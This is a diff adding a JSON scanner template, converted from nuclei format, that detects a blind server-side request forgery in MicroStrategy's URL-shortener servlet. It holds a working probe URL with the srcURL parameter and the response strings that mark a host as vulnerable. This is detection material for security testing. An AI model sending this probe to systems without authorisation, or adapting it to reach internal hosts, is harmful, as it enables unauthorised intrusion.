@@ -1,0 +1,119 @@
+{
+  "id": "microstrategy-ssrf",
+  "name": "MicroStrategy tinyurl - Server-Side Request Forgery (Blind)",
+  "author": "organiccrap",
+  "severity": "HIGH",
+  "description": "Blind server-side (SSRF) request forgery vulnerability on MicroStrategy URL shortener.",
+  "references": [
+    "https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204"
+  ],
+  "tags": [
+    "microstrategy",
+    "ssrf"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/servlet/taskProc?taskId\u003dshortURL\u0026taskEnv\u003dxml\u0026taskContentType\u003dxml\u0026srcURL\u003dhttps://google.com",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "taskResponse",
+            "The source URL is not valid"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "microstrategy-ssrf",
+    "info": {
+      "name": "MicroStrategy tinyurl - Server-Side Request Forgery (Blind)",
+      "author": "organiccrap",
+      "severity": "high",
+      "description": "Blind server-side (SSRF) request forgery vulnerability on MicroStrategy URL shortener.",
+      "reference": [
+        "https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204"
+      ],
+      "metadata": {
+        "max_request": 2
+      },
+      "tags": "microstrategy,ssrf"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/servlet/taskProc?taskId\u003dshortURL\u0026taskEnv\u003dxml\u0026taskContentType\u003dxml\u0026srcURL\u003dhttps://google.com",
+          "{{BaseURL}}/MicroStrategy/servlet/taskProc?taskId\u003dshortURL\u0026taskEnv\u003dxml\u0026taskContentType\u003dxml\u0026srcURL\u003dhttps://google.com"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "taskResponse",
+              "The source URL is not valid"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
